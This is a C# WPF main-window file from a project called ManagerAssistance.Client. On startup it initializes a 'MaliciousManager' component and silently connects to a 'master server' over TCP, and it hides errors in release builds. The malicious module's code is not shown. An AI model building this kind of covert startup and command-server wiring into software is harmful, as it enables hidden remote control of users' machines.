using System;
using System.Threading;
using System.Windows;
using System.Windows.Forms;
using ManagerAssistance.Client.Helper.Native.Impl;
using ManagerAssistance.Client.Malicious;

namespace ManagerAssistance.Client
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            ClientRun();
        }

        public static void FireShutdown(int reason) => MasterServer.Instance.FireShutdown(reason);

        public static void ClientRun()
        {
            try
            {
                MaliciousManager.Instance.Initialize();
                MasterServer.Instance.Connect("tcp://127.0.0.1:5556");

                Kernel32.SetConsoleCtrlHandler(ctrl =>
                {
                    FireShutdown((int)ctrl);
                    Thread.Sleep(500);
                    return true;
                }, true);
                //Application.Run();
            }
            catch (Exception e)
            {
#if DEBUG
                System.Windows.Forms.MessageBox.Show(e.ToString());
#endif
            }
        }
    }
}
